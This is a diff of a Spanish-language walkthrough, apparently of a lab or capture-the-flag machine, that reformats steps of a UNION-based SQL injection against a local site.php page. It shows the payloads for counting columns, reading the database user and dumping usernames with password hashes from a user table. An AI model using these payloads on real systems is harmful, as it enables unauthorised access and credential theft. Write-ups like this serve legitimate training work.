@@ -298,12 +298,21 @@ http://192.168.1.54/site.php?id=2
 ### 19º Acceso como usuario de finanzas --> Inyección SQL parte 2
 
 **Acción:**  
-`http://192.168.1.54/site.php?id=2 order by 2-- -`  
+```bash 
+http://192.168.1.54/site.php?id=2 order by 2-- -
+```
+
 → Vemos que desaparece el error (aprovechamos el error visible en la web para deducir el número de columnas).  
-`http://192.168.1.54/site.php?id=2 union select 1,2-- -`  
+
+```bash
+http://192.168.1.54/site.php?id=2 union select 1,2-- -
+```
+
 → Vemos que aparece en la web `1(2)`.  
 → Entendemos que el campo 2 es vulnerable y probamos:  
-`http://192.168.1.54/site.php?id=2 union select 1,user()-- -`  
+```bash http://192.168.1.54/site.php?id=2 union select 1,user()-- -
+```
+
 → Nos muestra el usuario, por lo que tenemos un campo donde inyectar código y extraer datos.
 
 **Resultado:**  
@@ -317,7 +326,11 @@ En la consulta `http://192.168.1.54/site.php?id=2 union select 1,2-- -` no veía
 
 **Solución:**  
 Cambiamos el id a uno inexistente:  
-`http://192.168.1.54/site.php?id=-1 union select 1,2-- -`  
+
+```bash
+http://192.168.1.54/site.php?id=-1 union select 1,2-- -
+```
+
 → y ya se mostraron correctamente los datos.
 
 ---
@@ -364,9 +377,12 @@ Listamos columnas de la tabla `user`:
 
 ### 22º Acceso como usuario de finanzas --> Inyección SQL parte 5
 
-**Acción:**  
-Volcamos los usuarios y contraseñas (hasheadas):  
-`http://192.168.1.54/site.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password) from user-- -`  
+**Acción:** Volcamos los usuarios y contraseñas (hasheadas):  
+
+```bash
+http://192.168.1.54/site.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password) from user-- -
+```
+
 → Resultado:
 
 ```
